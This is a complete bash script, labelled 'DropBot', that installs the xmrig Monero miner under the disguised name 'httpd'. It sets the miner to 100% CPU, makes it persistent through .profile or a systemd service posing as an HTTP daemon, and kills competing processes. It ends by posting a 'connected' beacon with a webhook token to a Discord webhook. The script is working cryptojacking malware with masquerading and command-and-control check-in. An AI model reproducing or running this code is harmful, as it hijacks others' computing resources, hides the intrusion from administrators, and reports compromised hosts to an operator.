#!/bin/bash

VERSION=1.0
apt install curl -y
# printing greetings

echo "DropBot mining setup script v$VERSION."
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> script.sh <wallet address>"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ "$(id -u)" == "0" ]; then
  IS_ROOT=1
else
  IS_ROOT=0
fi

if [ "$IS_ROOT" == "0" ]; then
  if [ -z $HOME ]; then
    echo "ERROR: Please define HOME environment variable to your home directory"
    exit 1
  fi

  if [ ! -d $HOME ]; then
    echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
    echo 'export HOME=<dir>'
    exit 1
  fi
else
  HOME=/etc
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# calculating port

CPU_THREADS=$(nproc)

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi
PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 19999 ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "19999" -o "$PORT" -gt "19999" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "If needed, miner in foreground can be started by $HOME/httpd/miner.sh script."
echo "Mining will happen to $WALLET wallet."

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using httpd_service systemd service."
fi

echo "This host has $CPU_THREADS CPU threads."

echo "Sleeping for 3 seconds before continuing (press Ctrl+C to cancel)"
sleep 3
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous httpd miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop httpd_service.service
fi
killall -9 httpd

echo "[*] Removing $HOME/httpd directory"
rm -rf $HOME/httpd

echo "[*] Downloading xmrig to /tmp/httpd.tar.gz"
if ! curl -L --progress-bar "http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/httpd.tar.gz; then
  echo "ERROR: Can't download http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/httpd.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/httpd.tar.gz to $HOME/httpd"
[ -d $HOME/httpd ] || mkdir $HOME/httpd
if ! tar xf /tmp/httpd.tar.gz -C $HOME/httpd; then
  echo "ERROR: Can't unpack /tmp/httpd.tar.gz to $HOME/httpd directory"
  exit 1
fi
rm /tmp/httpd.tar.gz
mv $HOME/httpd/xmrig $HOME/httpd/httpd

echo "[*] Checking if advanced version of $HOME/httpd/httpd works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/httpd/config.json
$HOME/httpd/httpd --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/httpd/httpd ]; then
    echo "WARNING: Advanced version of $HOME/httpd/httpd is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/httpd/httpd was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/httpd.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/httpd.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/httpd.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/httpd.tar.gz to $HOME/httpd"
  if ! tar xf /tmp/httpd.tar.gz -C $HOME/httpd --strip=1; then
    echo "WARNING: Can't unpack /tmp/httpd.tar.gz to $HOME/httpd directory"
  fi
  rm /tmp/httpd.tar.gz

  echo "[*] Checking if stock version of $HOME/httpd/httpd works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/httpd/config.json
  $HOME/httpd/httpd --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/httpd/httpd ]; then
      echo "ERROR: Stock version of $HOME/httpd/httpd is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/httpd/httpd was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/httpd/httpd is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi

sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/httpd/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/httpd/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/httpd/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/httpd/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/httpd/xmrig.log'",#' $HOME/httpd/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/httpd/config.json

cp $HOME/httpd/config.json $HOME/httpd/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/httpd/config_background.json

# preparing script

echo "[*] Creating $HOME/httpd/miner.sh script"
cat >$HOME/httpd/miner.sh <<EOL
#!/bin/bash
if ! pidof httpd >/dev/null; then
  nice $HOME/httpd/httpd \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall httpd\" or \"sudo killall httpd\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/httpd/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep httpd/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/httpd/miner.sh script to $HOME/.profile"
    echo "$HOME/httpd/miner.sh --config=$HOME/httpd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/httpd/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/httpd/httpd.log file)"
  /bin/bash $HOME/httpd/miner.sh --config=$HOME/httpd/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/httpd/httpd.log file)"
    /bin/bash $HOME/httpd/miner.sh --config=$HOME/httpd/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating httpd_service systemd service"
    cat >/tmp/httpd_service.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/httpd/httpd --config=$HOME/httpd/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/httpd_service.service /etc/systemd/system/httpd_service.service
    echo "[*] Starting httpd_service systemd service"
    sudo killall httpd 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable httpd_service.service
    sudo systemctl start httpd_service.service
    echo "To see miner service logs run \"sudo journalctl -u httpd_service -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e httpd -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e httpd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e httpd -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/httpd/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/httpd/config_background.json"
fi
echo ""

echo "[*] Setup complete"

discord_url="https://discord.com/api/webhooks/1190082010241302658/g-OP0V5BlJNZTvu1teYeEYXtCNT1aLAg_tooRXW4sxsVzBlJzVUlTdDnCYZBppK5xkpP"

generate_post_data() {
  cat <<EOF
{
  "content": "Srozovic povezan",
  "embeds": [{
    "title": "Srozovic povezan",
    "description": "Srozovici u akciju!",
    "color": "45973"
  }]
}
EOF
}


# POST request to Discord Webhook
curl -H "Content-Type: application/json" -X POST -d "$(generate_post_data)" $discord_url


